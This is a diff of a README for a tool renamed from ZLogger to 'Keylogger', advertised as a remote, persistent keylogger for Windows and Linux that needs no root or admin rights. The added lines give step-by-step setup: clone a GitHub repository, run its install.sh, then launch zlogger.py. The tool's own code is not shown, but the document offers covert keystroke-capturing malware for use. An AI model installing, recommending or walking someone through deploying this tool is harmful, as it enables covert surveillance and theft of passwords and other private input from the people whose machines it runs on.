@@ -1,6 +1,6 @@
-# ZLogger
+# Keylogger
 
-Remote persistent keylogger for Windows and Linux.
+## Remote persistent keylogger for Windows and Linux.
 
 Features:
 - Logs keys pressed on keyboard
@@ -10,4 +10,31 @@ Features:
 - Does not require root or admin privlages.
 
 
+## Installation
+
+### 1. Nvigate to the /opt directory (optional):
+```
+$ cd /opt/
+```
+
+### 2. Clone the repo
+```
+$ git clone https://github.com/dharun-narayanan/Keylogger.git
+```
+
+### 3. Navigate into zLogger’s directory
+```
+$ cd Keylogger
+```
+
+### 4. Run the installer
+```
+$ bash install.sh
+```
+PS: this might take some time as it’ll install all the programs and libraries needed by Keylogger.
+
+### 5. Done, now you can run zLogger from this working directory using the following command
+```
+$ python zlogger.py
+```
 
